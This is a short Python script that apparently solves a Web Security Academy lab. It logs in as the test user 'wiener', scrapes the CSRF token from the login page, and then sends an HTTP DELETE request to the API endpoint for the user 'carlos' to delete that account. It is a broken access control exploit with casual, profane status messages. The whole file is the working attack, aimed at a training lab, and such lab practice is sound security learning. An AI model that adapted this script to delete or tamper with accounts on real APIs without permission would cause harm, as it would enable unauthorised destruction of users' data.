import requests
from bs4 import BeautifulSoup


TARGET_ACCOUNT = "carlos"

LINK = "https://0a7f00be0322b13184fa370500cc009f.web-security-academy.net/"
LOGIN_LINK = LINK + "/login"
ACCOUNT_PAGE = LINK + "/my-account"
DELETE_URL = LINK + "/api/user/" + TARGET_ACCOUNT

LOGIN_DATA = {
    "username":"wiener",
    "password":"peter"
}

s = requests.Session()

def main():
    res = s.get(LOGIN_LINK) # csrf token olish uchun so'rov
    csrf_token = BeautifulSoup(res.text,"html.parser").find("input",{"name":"csrf"})['value']
    LOGIN_DATA["csrf"] = csrf_token 

    login_request = s.post(LOGIN_LINK,data=LOGIN_DATA)
    
    cookie = s.cookies.get_dict()

    print("CSRF:",csrf_token)
    print("LOGIN:",login_request.status_code)
    print("Current Cookies:",cookie)
    print("Account-page status",s.get(ACCOUNT_PAGE).status_code)

    print("Start Attacking!!!")
    res = s.delete(DELETE_URL)
    

    if res.status_code == 200:
        print("Mession Success, Bro :)")
    else:
        print("We have fuckin problem bro :(")
        print("'cause status code is",res.status_code)
if __name__ == "__main__":
    main()
